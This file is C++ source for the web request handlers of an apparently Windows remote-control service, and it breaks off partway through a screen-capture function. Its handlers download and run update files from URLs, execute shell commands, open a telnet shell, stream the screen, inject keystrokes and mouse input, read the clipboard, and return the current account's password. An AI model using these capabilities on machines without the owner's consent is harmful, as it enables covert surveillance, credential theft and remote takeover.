/*******************************************************************
   *	webAction.cpp web request processing
   *    DESCRIPTION:
   *
   *    AUTHOR:yyc
   *
   *    HISTORY:
   *
   *    DATE:
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "other\wutils.h"
#include "other\ipf.h"
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")
// WASAPI loopback audio capture (Windows Vista and later)
#include <audioclient.h>
#include <mmdeviceapi.h>
#pragma comment(lib, "ole32.lib")

void downThreadX(char *strParam)
{
	if(strParam==NULL) return;
	bool bUpdate=false; std::string strURL;
	if(strParam[0]!='*') strURL.assign(strParam);
	else{ strURL.assign(strParam+1); bUpdate=true; }

	int iType=0; const char *strurl=strURL.c_str();
	if(strncasecmp(strurl,"http://",7)==0) iType=1;
	else if(strncasecmp(strurl,"https://",8)==0) iType=1;
	else if(strncasecmp(strurl,"ftp://",6)==0) iType=2;
	delete[] strParam; if(iType==0) return;
	
	std::string strSaveas,strOutput; clsOutput sout;
	const char *ptr=strchr(strurl,' ');
	if( ptr ){ *(char *)ptr=0; ptr+=1;
		while(*ptr==' ') ptr++; strSaveas.assign(ptr); 
	}
	if(strSaveas==""){ if( (ptr=strrchr(strurl,'/')) ) strSaveas.assign(ptr+1); }
	if(strSaveas[0]!='\\' && strSaveas[1]!=':') strSaveas.insert(0,g_savepath);
	if(bUpdate) strSaveas.append(".upd"); //prevent downloaded file from having the same name as the program to be upgraded
	BOOL bRet=(iType==2)?downfile_ftp(strurl,strSaveas.c_str(),sout):
							 downfile_http(strurl,strSaveas.c_str(),sout);
	if(bRet && bUpdate)  updateRV(strSaveas.c_str(),strOutput);
}
bool webServer :: httprsp_docommandEx(socketTCP *psock,httpResponse &httprsp,const char *strCommand)
{
	if(strCommand==NULL) return false;
	while(*strCommand==' ') strCommand++; //remove spaces
	if(*strCommand!='#') 
		return httprsp_file_run(psock,httprsp,strCommand);
	//otherwise process extended commands
	const char *strCmd=++strCommand;
	const char *strParam=strchr(strCommand,' ');
	if(strParam) { *(char *)strParam=0; strParam++; }

	BOOL bRet=FALSE; std::string strRet; //command execution return
	std::string strUpdateFile=""; //rmtsvc local upgrade file
	std::string strDownFile=""; //local file download redirect URL
	if(strcasecmp(strCmd,"update")==0 || strcasecmp(strCmd,"down")==0) //upgrade or download
	{
		strRet="wrong command format!\r\n";
		if(strParam) while(*strParam==' ') strParam++;
		if(strParam && strParam[0]){
			bool bUpdate=(strcasecmp(strCmd,"update")==0);
			if(strstr(strParam,"://")){
				int iLen=strlen(strParam)+8;
				char *downParam=new char[iLen];
				if(downParam){
					if(bUpdate){ downParam[0]='*';
						strcpy(downParam+1,strParam);
					}else strcpy(downParam,strParam);
					if( m_threadpool.addTask((THREAD_CALLBACK *)&downThreadX,(void *)downParam,0)!=0 ){
						strRet.assign("Download from "); strRet.append(strParam);
						strRet.append("\r\n"); bRet=TRUE;
					}else strRet.assign("Failed to start downloa-thread\r\n");
					if(!bRet) delete[] downParam; 
				}else strRet.assign("Failed to start downloa-thread\r\n");
			}else if(!bUpdate)
			{//download the specified local file
				const char *filename,*filepath=NULL;
				const char *ptr=strrchr(strParam,'\\');
				if(ptr){ *(char *)ptr=0;
					filename=ptr+1;
					filepath=strParam;
				} else filename=strParam;
				strDownFile.assign("/download/");
				strDownFile.append(filename);
				strDownFile.append("?path=");
				if(filepath) strDownFile.append(filepath);
			}else{ //upgrade rmtsvc with the specified local file
				strUpdateFile.assign(strParam);
				strRet.assign("Update program...\r\n");
				strRet.append(strParam); bRet=TRUE;
			}
		}//?if(strParam && strParam[0])
	}else bRet=doCommandEx(strCmd,strParam,strRet);
	cBuffer buffer(512);
	buffer.len()+=sprintf(buffer.str()+buffer.len(),"<?xml version=\"1.0\" encoding=\"gb2312\" ?><xmlroot>");
	if(strDownFile!="") 
		 buffer.len()+=sprintf(buffer.str()+buffer.len(),"<dwurl>%s</dwurl>",strDownFile.c_str());
	else buffer.len()+=sprintf(buffer.str()+buffer.len(),"<retmsg>%s</retmsg>",strRet.c_str());
	buffer.len()+=sprintf(buffer.str()+buffer.len(),"</xmlroot>");

	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//set response content length
	httprsp.lContentLength(buffer.len());
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buffer.len(),buffer.str(),-1);
	if(strUpdateFile!="") updateRV(strUpdateFile.c_str(),strRet);
	return (bRet)?true:false;
}
bool webServer :: httprsp_version(socketTCP *psock,httpResponse &httprsp)
{
	char buffer[256]; int len;
	if(m_bAnonymous)
	len=sprintf(buffer,"%s<br>&nbsp;<font color=red>currently anonymous access; for security please configure access account and permissions in ini</font>",
				MyService::ServiceVers);
	else len=sprintf(buffer,"%s",MyService::ServiceVers);
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
//	httprsp.set_mimetype(MIMETYPE_TEXT);
	httprsp.AddHeader(string("Content-Type"),string("text/html; charset=gb2312"));
	httprsp.lContentLength(len); //set response content length
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(len,buffer,-1); 
	return true;
}

bool webServer:: httprsp_telnet(socketTCP *psock,httpResponse &httprsp,long lAccess)
{
	socketTCP telSock; char buf[128]; int iport;
	MyService *psvr=MyService::GetService();
	socketBase *pevent=(psvr)?psvr->GetSockEvent():NULL;
	telSock.setParent(pevent);
	if( (iport=telSock.ListenX(0,FALSE,NULL))>0 )
		 iport=sprintf(buf,"telnet://%s:%d/",psock->getLocalIP(),iport);
	else iport=sprintf(buf,"Failed to start Telnet.");
	
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//set response content length
	httprsp.lContentLength(iport); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(iport,buf,-1); psock->Close();
	if(telSock.Accept(HTTP_MAX_RESPTIMEOUT,NULL)<=0) return false;
	cTelnetEx telSvr; telSvr.Attach(&telSock);
	return true;
}

bool webServer::httprsp_login(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	session["user"]=""; session["lAccess"]=""; 
	const char *ptr_user=httpreq.Request("user");
	const char *ptr_pswd=httpreq.Request("pswd");
	const char *ptr_chkcode=httpreq.Request("chkcode");
	const char *ptr_key=httpreq.Request("key");
	if(ptr_user && ptr_pswd && ptr_chkcode)
	{
		if( session["chkcode"]!="" && 
			strcasecmp(session["chkcode"].c_str(),ptr_chkcode)==0)  //yyc modify 2006-09-14: case-insensitive
		{//verify account and password, and get user's permissions
			::_strlwr((char *)ptr_user); //convert to lowercase

			std::map<std::string,std::pair<std::string,long> >::iterator it=m_mapUsers.find(ptr_user);
			if(it!=m_mapUsers.end())
			{
				if((*it).second.first==std::string(ptr_pswd))
				{
					session["user"]=(*it).first;
					char tmp[16]; sprintf(tmp,"%d",(*it).second.second);
					session["lAccess"]=string(tmp);
					this->httprsp_Redirect(psock,httprsp,"/");
					return true;
				}
			}
		}//?authentication code correct
	}//?if(ptr_user && ptr_pswd && ptr_chkcode)

	return false;
}
//set to only capture the screen of the specified window
bool webServer:: httprsp_capWindow(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	const char *ptr; char buf[256];
	int buflen, act=0; POINT pt; RECT rc;
	rc.left=rc.top=0; pt.x=pt.y=0;
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	
	if( (ptr=httpreq.Request("act")) ) act=atoi(ptr);
	if( (ptr=httpreq.Request("x")) ) pt.x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) ) pt.y=atoi(ptr);
	pt.x+=rc.left; pt.y+=rc.top;
	
	if(act==1) //capture the specified window
	{
		hwnd=WindowFromPoint(pt);
		sprintf(buf,"%ld",(long)(LONG_PTR)hwnd);
		session["cap_hwnd"]=buf;
	}else if(act==2){ //capture the entire screen
		hwnd=NULL;
		session["cap_hwnd"]=string("null");
	} //otherwise just get status
	
	if(hwnd==NULL)
		buflen=sprintf(buf,"hwnd is null");
	else buflen=GetWindowText(hwnd,buf,128);
	std::string s(buf);
	buflen=sprintf(buf,"<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n"
				"<xmlroot>\r\n"
				"<hwnd>%ld</hwnd>\r\n"
				"<wtext>%s</wtext>\r\n"
				"</xmlroot>",(long)(LONG_PTR)hwnd,s.c_str());

	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//set response content length
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//get/set image quality; bSetting - whether setting is allowed
//getcurrentloginuserandpermissions
bool webServer:: httprsp_capSetting(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp
									,httpSession &session,bool bSetting)
{
	const char *ptr; char buf[1024];
	if(bSetting &&  (ptr=httpreq.Request("quality")) )
	{	
		m_quality=atol(ptr);
		if(m_quality<1 || m_quality>100) m_quality=60;
	}
//	if(bSetting && (ptr=httpreq.Request("lockmskb")) )
//		SetMouseKeybHook( (atol(ptr)==1) );

	if(bSetting && (ptr=httpreq.Request("imgsize")) )
		m_dwImgSize=(DWORD)atol(ptr);
	
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	int buflen=sprintf(buf,"<xmlroot>\r\n"
				"<userAgent><![CDATA[%s]]></userAgent>\r\n"
				"<quality>%d</quality>\r\n"
				"<imgsize>%d</imgsize>\r\n"
				"<qx>%s</qx>\r\n"
				"<ssid>%s</ssid>\r\n"
				"<lockmskb>%d</lockmskb>\r\n"
				"<hwnd>%ld</hwnd>\r\n"
				"</xmlroot>",httpreq.Header("User-Agent"),
				m_quality,((m_dwImgSize==0)?0:1),session["lAccess"].c_str(),
				session.sessionID(),0,(long)(LONG_PTR)hwnd);
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//set response content length
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

bool webServer :: httprsp_msevent(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	int x=0,y=0,dragx=0,dragy=0;
	long dwData=0; short flag=0;
	const char *ptr;
	if( (ptr=httpreq.Request("x")) )
		x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) )
		y=atoi(ptr);
	if( (ptr=httpreq.Request("dragx")) )
		dragx=atoi(ptr);
	if( (ptr=httpreq.Request("dragy")) )
		dragy=atoi(ptr);
	if( (ptr=httpreq.Request("wheel")) )
		dwData=atol(ptr);

	if( (ptr=httpreq.Request("button")) )
		flag=(short)(atoi(ptr) & 0x0f);
	if( (ptr=httpreq.Request("altk")) )
		flag |=(short)(atoi(ptr) & 0x000f)<<8;
	
	RECT rc; rc.left=rc.top=0;
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	x+=rc.left; y+=rc.top; dragx+=rc.left; dragy+=rc.top;

	if( (ptr=httpreq.Request("act")) )
	{
		short i=(atoi(ptr) & 0x000f);
		RW_LOG_DEBUG("httprsp_msevent: x=%d y=%d button=0x%02x altk=0x%02x act=%d dragx=%d dragy=%d wheel=%ld cap_hwnd=%ld\r\n",
			x, y, (unsigned)(flag&0x0f), (unsigned)((flag>>8)&0x0f), (int)i, dragx, dragy, dwData, (long)(LONG_PTR)hwnd);
		if(i==4) //dragdrop
			Wutils::sendMouseEvent(dragx,dragy,(flag |0x0030),0);//first simulate drag action
		flag |=(i<<4); 
	}
	else
	{
		RW_LOG_DEBUG("httprsp_msevent: x=%d y=%d button=0x%02x altk=0x%02x act=0(move) cap_hwnd=%ld\r\n",
			x, y, (unsigned)(flag&0x0f), (unsigned)((flag>>8)&0x0f), (long)(LONG_PTR)hwnd);
	}
	
	Wutils::sendMouseEvent(x,y,flag,dwData);
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//set response content length
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_keyevent(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp)
{
	short vkey=0;
	const char *ptr,*ptr_vkey=httpreq.Request("vkey");
	RW_LOG_DEBUG("httprsp_keyevent: vkey_param=%s\r\n", ptr_vkey ? ptr_vkey : "(null)");
	if(ptr_vkey)
	{
		while( (ptr=strchr(ptr_vkey,',')) )
		{
			*(char *)ptr=0;
			if( (vkey=(short)(atoi(ptr_vkey)& 0xffff))!=0 )
				Wutils::sendKeyEvent(vkey);
			ptr_vkey=ptr+1;
		}//?while
	}//?if(ptr_vkey)

	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//set response content length
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_command(socketTCP *psock,httpResponse &httprsp,const char *ptrCmd)
{
	if(ptrCmd)
	{
		if(strcmp(ptrCmd,"CtAlDe")==0) 
			Wutils::SimulateCtrlAltDel();
		else if(strcmp(ptrCmd,"ShDw")==0)
			Wutils::ShutDown();
		else if(strcmp(ptrCmd,"ReSt")==0)
			Wutils::Restart();
		else if(strcmp(ptrCmd,"Lock")==0)
			Wutils::LockWorkstation();
		else if(strcmp(ptrCmd,"LgOf")==0)
			Wutils::Logoff();
	}
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_HTML);
	//set response content length
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK"); 
	return true;
}

bool webServer :: httprsp_cmdpage(socketTCP *psock,httpResponse &httprsp,const char *ptrCmd)
{
	MyService *psvr=MyService::GetService();
	std::string strBuffer;
	if(psvr && psvr->m_preCmdpage!="")
		strBuffer=string("\"")+psvr->m_preCmdpage+string("\" ");
	if(ptrCmd) strBuffer.append(ptrCmd);

	docmd_exec2buf(strBuffer,true,5); 
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//set response content length
	httprsp.lContentLength(strBuffer.length()); 
	httprsp.send_rspH(psock,200,"OK"); 
	if(strBuffer!="") psock->Send(strBuffer.length(),strBuffer.c_str(),-1);
	return true;
}

bool webServer :: httprsp_GetClipBoard(socketTCP *psock,httpResponse &httprsp)
{
	std::string strContent;
	Wutils::selectDesktop();
	if(IsClipboardFormatAvailable(CF_TEXT))
	{
		if(OpenClipboard(NULL))
		{
			HGLOBAL hglb = GetClipboardData(CF_TEXT);
			if (hglb != NULL)
			{
				LPTSTR lptstr=(LPTSTR)GlobalLock(hglb);
				if(lptstr!=NULL) strContent.assign(lptstr);
				GlobalUnlock(hglb);
			}
			CloseClipboard();
		}
	}//?if(IsClipboardForma...
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//set response content length
	httprsp.lContentLength(strContent.length()); 
	httprsp.send_rspH(psock,200,"OK");
	if(strContent!="") psock->Send(strContent.length(),strContent.c_str(),-1);
	return true;
}
bool webServer :: httprsp_SetClipBoard(socketTCP *psock,httpResponse &httprsp,const char *strval)
{
	std::string strContent;
	Wutils::selectDesktop();
	if(strval && OpenClipboard(NULL))
	{
		if (::EmptyClipboard())// clear clipboard
		{	
			size_t len=strlen(strval);// allocate memory block
			HANDLE hMem= ::GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE, len+1);
			if (hMem)
			{
				LPSTR lpMem = (LPSTR)::GlobalLock(hMem);
				if (lpMem)
				{
					::memcpy((void*)lpMem, (const void*)strval, len+1);
					::SetClipboardData(CF_TEXT,hMem);	
				}//?if (lpMem)
				::GlobalUnlock(hMem);
			}//?hMem
		}
		CloseClipboard();
	}//?if(OpenClipboard(NULL))
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_TEXT);
	//set response content length
	httprsp.lContentLength(0); 
	httprsp.send_rspH(psock,200,"OK");
	return true;
}

// Returns the current server cursor shape as a JSON CSS cursor name string.
// Uses the same thread-attachment technique as capDesktop to retrieve the active cursor.
bool webServer::httprsp_getCursor(socketTCP *psock, httpResponse &httprsp)
{
	POINT ptCursor;
	::GetCursorPos(&ptCursor);
	HWND hw = ::WindowFromPoint(ptCursor);
	if(hw == NULL) hw = ::GetDesktopWindow();
	DWORD hdl = ::GetWindowThreadProcessId(hw, NULL);
	::AttachThreadInput(::GetCurrentThreadId(), hdl, TRUE);
	HCURSOR hCursor = ::GetCursor();
	::AttachThreadInput(::GetCurrentThreadId(), hdl, FALSE);

	// Map Windows system cursor handles to CSS cursor names
	static const struct { LPTSTR id; const char *css; } cursorMap[] = {
		{ IDC_IBEAM,       "text"        },
		{ IDC_WAIT,        "wait"        },
		{ IDC_CROSS,       "crosshair"   },
		{ IDC_SIZENWSE,    "nwse-resize" },
		{ IDC_SIZENESW,    "nesw-resize" },
		{ IDC_SIZEWE,      "ew-resize"   },
		{ IDC_SIZENS,      "ns-resize"   },
		{ IDC_SIZEALL,     "move"        },
		{ IDC_NO,          "not-allowed" },
		{ IDC_HAND,        "pointer"     },
		{ IDC_APPSTARTING, "progress"    },
		{ IDC_HELP,        "help"        },
		{ NULL,            NULL          }
	};
	const char *cssCursor = "default";
	if(hCursor)
	{
		for(int i = 0; cursorMap[i].id != NULL; i++)
		{
			if(::LoadCursor(NULL, cursorMap[i].id) == hCursor)
			{
				cssCursor = cursorMap[i].css;
				break;
			}
		}
	}

	char json[64];
	int jlen = sprintf(json, "{\"cursor\":\"%s\"}", cssCursor);

	httprsp.NoCache();
	httprsp.set_mimetype(MIMETYPE_TEXT);
	httprsp.lContentLength(jlen);
	httprsp.send_rspH(psock, 200, "OK");
	psock->Send(jlen, json, -1);
	return true;
}

DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &lpbits);
bool webServer:: httprsp_capDesktop(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	bool ifCapCursor=true;
	WORD w=LOWORD(m_dwImgSize);
	WORD h=HIWORD(m_dwImgSize);
	LPBYTE lpbits=NULL;
	Wutils::selectDesktop();
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	DWORD dwRet=capDesktop(hwnd,w,h,ifCapCursor,m_quality,lpbits);
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//set response content length
	httprsp.lContentLength(dwRet); 
	httprsp.send_rspH(psock,200,"OK");
	if(lpbits)
	{
		psock->Send(dwRet,(const char *)lpbits,-1);
		::free(lpbits); 
	}
	return true;
}

// MJPEG stream: continuously sends JPEG frames as a multipart/x-mixed-replace response
bool webServer::httprsp_capStream(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	static const char *boundary = "mjpegboundary";
	char header[512];
	int hlen = sprintf(header,
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: multipart/x-mixed-replace; boundary=%s\r\n"
		"Cache-Control: no-cache, no-store, must-revalidate\r\n"
		"Pragma: no-cache\r\n"
		"Connection: close\r\n"
		"\r\n", boundary);
	if(psock->Send(hlen, header, -1) < 0) return true;

	bool ifCapCursor = true;
	WORD w = LOWORD(m_dwImgSize);
	WORD h = HIWORD(m_dwImgSize);
	HWND hwnd = (HWND)atol(session["cap_hwnd"].c_str());

	while(psock->checkSocket(0, SOCKS_OP_WRITE) >= 0)
	{
		Wutils::selectDesktop();
		LPBYTE lpbits = NULL;
		DWORD dwRet = capDesktop(hwnd, w, h, ifCapCursor, m_quality, lpbits);
		if(dwRet > 0 && lpbits)
		{
			char frameheader[256];
			int fhlen = sprintf(frameheader,
				"--%s\r\n"
				"Content-Type: image/jpeg\r\n"
				"Content-Length: %lu\r\n"
				"\r\n", boundary, (unsigned long)dwRet);
			SOCKSRESULT sr = psock->Send(fhlen, frameheader, -1);
			if(sr >= 0) sr = psock->Send(dwRet, (const char*)lpbits, -1);
			if(sr >= 0) sr = psock->Send(2, "\r\n", -1);
			::free(lpbits);
			if(sr < 0) break;
		}
		else
		{
			if(lpbits) ::free(lpbits);
		}
		Sleep(100); // ~10 fps
	}
	return true;
}

bool webServer::httprsp_sysinfo(socketTCP *psock,httpResponse &httprsp)
{
	char buf[512]; int buflen=0;
	buflen=sprintf(buf,"<xmlroot>\r\n");
	buflen+=sprintf(buf+buflen,"<pcname>%s</pcname>\r\n",Wutils::computeName());
	MSOSTYPE ostype=Wutils::winOsType(); //systemtype
	buflen+=sprintf(buf+buflen,"<OS>%s</OS>\r\n",Wutils::getLastInfo());
	Wutils::cpuInfo(ostype);//cpuinfo
	buflen+=sprintf(buf+buflen,"<CPU>%s</CPU>\r\n",Wutils::getLastInfo());
	Wutils::winOsStatus();//currentsystemstatus
	buflen+=sprintf(buf+buflen,"<status>%s</status>\r\n",Wutils::getLastInfo());
	Wutils::FindPassword(NULL);//currentsystemaccount/password
	buflen+=sprintf(buf+buflen,"<account>%s</account>\r\n",Wutils::getLastInfo());
	//currentprocess ID
	buflen+=sprintf(buf+buflen,"<pid>%d</pid>\r\n",::GetCurrentProcessId());
	buflen+=sprintf(buf+buflen,"</xmlroot>");
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//set response content length
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//generate numeric verification code image
DWORD chkcodeImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits,const  char *chkcode);
bool webServer::httprsp_checkcode(socketTCP *psock,httpResponse &httprsp,httpSession &session)
{
	//generate 5-bit verification code and write to session
	char tmpBuf[8]; srand((unsigned int)time(NULL));
	tmpBuf[5]=0;//generate random number
	for(int i = 0;   i < 5;i++ )
	{
		 char c=(char)((rand()*30)/RAND_MAX);
		 if(c<10) c+=48; else c+=55; //0~9 'A' - 'K'
		 tmpBuf[i]=c;
	}
	session["chkcode"]=tmpBuf;
	//generate image and send
	BITMAPINFOHEADER bih;
	::memset(&bih,0,sizeof(BITMAPINFOHEADER));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = 50;
	bih.biHeight = 20;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage =bih.biHeight *DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount );
	LPBYTE lpbits=new BYTE[bih.biSizeImage];
	DWORD dwret=chkcodeImage(&bih,lpbits,tmpBuf);
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//set response content length
	httprsp.lContentLength(dwret); 
	httprsp.send_rspH(psock,200,"OK");
	if(dwret>0) psock->Send(dwret,(const char *)lpbits,-1);
	delete[] lpbits; return true;
}

DWORD usageImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits);
bool webServer::httprsp_usageimage(socketTCP *psock,httpResponse &httprsp)
{
	BITMAPINFOHEADER bih;
	::memset(&bih,0,sizeof(BITMAPINFOHEADER));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = 200;
	bih.biHeight = 80;
	bih.biPlanes = 1;
	bih.biBitCount = 24;
	bih.biCompression = BI_RGB;
	bih.biSizeImage =bih.biHeight *DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount );
	LPBYTE lpbits=new BYTE[bih.biSizeImage];
	DWORD dwret=usageImage(&bih,lpbits);
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_JPG);
	//set response content length
	httprsp.lContentLength(dwret); 
	httprsp.send_rspH(psock,200,"OK");
	if(dwret>0) psock->Send(dwret,(const char *)lpbits,-1);
	delete[] lpbits; return true;
}

//---------------------------------------------------------------------
//---------------------------------------------------------------------
//generate verification code image
DWORD chkcodeImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits,const  char *chkcode)
{
	if(lpbits==NULL || lpbih==NULL || chkcode==NULL) return 0;
	HDC hWndDC = ::GetWindowDC(NULL);
	HDC hMemDC = ::CreateCompatibleDC(hWndDC);
	HBITMAP hMemBmp = ::CreateCompatibleBitmap(hWndDC, lpbih->biWidth , lpbih->biHeight);
	HBITMAP hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);

	RECT rt={0,0,0,0}; rt.right=lpbih->biWidth; rt.bottom=lpbih->biHeight;
	HBRUSH hbr=::CreateSolidBrush(0x0);//create black brush
	::FillRect(hMemDC,&rt,hbr);//background is black
	::DeleteObject(hbr);
	
	int oldMode=::SetBkMode(hMemDC,TRANSPARENT);
	COLORREF oldColor=::SetTextColor(hMemDC,0x00ffffff);
	rt.top=2;rt.left=2;
	::DrawText(hMemDC,chkcode,strlen(chkcode),&rt,DT_TOP|DT_LEFT);
	//resume
	::SetBkMode(hMemDC,oldMode);
	::SetTextColor(hMemDC,oldColor);
	
	//get image data and perform JPEG compression
	DWORD dwret=0;
	if(::GetDIBits(hMemDC,hMemBmp,0,lpbih->biHeight,lpbits,(LPBITMAPINFO)lpbih,DIB_RGB_COLORS))
		dwret=cImageF::IPF_EncodeJPEG(lpbih,lpbits,lpbits,60); //perform JPEG compression

	::DeleteObject(hMemBmp);
	::SelectObject(hMemDC, hOldBmp);	
	::DeleteDC(hMemDC);
	::ReleaseDC(NULL, hWndDC);
	return dwret;
}

//generate CPU usage and memory usage image, return image data size
DWORD usageImage(LPBITMAPINFOHEADER lpbih,LPBYTE lpbits)
{
	#define POINTNUM 20 //number of points per curve
	static int cpuLinePoint[POINTNUM]={0}; //points for drawing CPU curve
	static int memLinePoint[POINTNUM]={0}; //points for drawing memory curve
	static int pointStart=0;//storage position of first point
	static int pointEnd=0;//storage position of next point
	
	if(lpbits==NULL || lpbih==NULL) return 0;
	int i,STEPWIDTH=lpbih->biWidth/POINTNUM;
	HDC hWndDC = ::GetWindowDC(NULL);
	HDC hMemDC = ::CreateCompatibleDC(hWndDC);
	RECT rt; rt.left =rt.top=0;
	rt.right =lpbih->biWidth; rt.bottom =lpbih->biHeight;
	HBITMAP hMemBmp = ::CreateCompatibleBitmap(hWndDC, rt.right -rt.left , rt.bottom -rt.top );
	HBITMAP hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	
	HBRUSH hbr=::CreateSolidBrush(0x0);//create black brush
	::FillRect(hMemDC,&rt,hbr);//background is black
	::DeleteObject(hbr);
	//draw grid lines
	HPEN hpen=::CreatePen(PS_SOLID,1,0x004040);
	HPEN hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	for(i=rt.left+STEPWIDTH;i<rt.right;i+=STEPWIDTH)
	{
		::MoveToEx(hMemDC,i,rt.top,NULL);
		::LineTo(hMemDC,i,rt.bottom);
	}
	for(i=rt.top+STEPWIDTH;i<rt.bottom ;i+=STEPWIDTH)
	{
		::MoveToEx(hMemDC,rt.left,i,NULL);
		::LineTo(hMemDC,rt.right,i);
	}
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	//get current CPU usage and memory usage data
	//***********start*****************
	if(pointEnd>0 && (pointEnd%POINTNUM)==(pointStart%POINTNUM)) pointStart+=1;
	cpuLinePoint[pointEnd%POINTNUM]=Wutils::getCPUusage();
	memLinePoint[pointEnd%POINTNUM]=Wutils::getMEMusage();
	pointEnd+=1;
	//***********end*******************
	//draw CPU usage curve -- green line
	hpen=::CreatePen(PS_SOLID,1,0x00ff00);
	hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	int j=0,hg=rt.bottom -rt.top ;
	::MoveToEx(hMemDC,j*STEPWIDTH,rt.bottom-(cpuLinePoint[pointStart%POINTNUM]*hg)/100,NULL);
	for(i=pointStart+1;i<pointEnd;i++,j++)
		::LineTo(hMemDC,(j+1)*STEPWIDTH,rt.bottom-(cpuLinePoint[i%POINTNUM]*hg)/100);
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	j=0;//draw memory usage curve -- yellow line
	hpen=::CreatePen(PS_SOLID,1,0x00ffff);
	hOldpen=(HPEN)::SelectObject(hMemDC,hpen);
	::MoveToEx(hMemDC,j*STEPWIDTH,rt.bottom-(memLinePoint[pointStart%POINTNUM]*hg)/100,NULL);
	for(i=pointStart+1;i<pointEnd;i++,j++)
		::LineTo(hMemDC,(j+1)*STEPWIDTH,rt.bottom-(memLinePoint[i%POINTNUM]*hg)/100);
	::SelectObject(hMemDC, hOldpen);
	::DeleteObject(hpen);
	
	//get image data and perform JPEG compression
	DWORD dwret=0;
	if(::GetDIBits(hMemDC,hMemBmp,0,lpbih->biHeight,lpbits,(LPBITMAPINFO)lpbih,DIB_RGB_COLORS))
		dwret=cImageF::IPF_EncodeJPEG(lpbih,lpbits,lpbits,60); //perform JPEG compression

	::DeleteObject(hMemBmp);
	::SelectObject(hMemDC, hOldBmp);	
	::DeleteDC(hMemDC);
	::ReleaseDC(NULL, hWndDC);
	return dwret;
}

DWORD capDesktop(HWND hWnd,WORD w,WORD h,bool ifCapCursor,long quality,LPBYTE &lpbits)
{
//	static LPBYTE lpbuffer=NULL;
//	static DWORD dwbuffer_size=0;
	LPBYTE lpbuffer=NULL;
	DWORD dwbuffer_size=0;
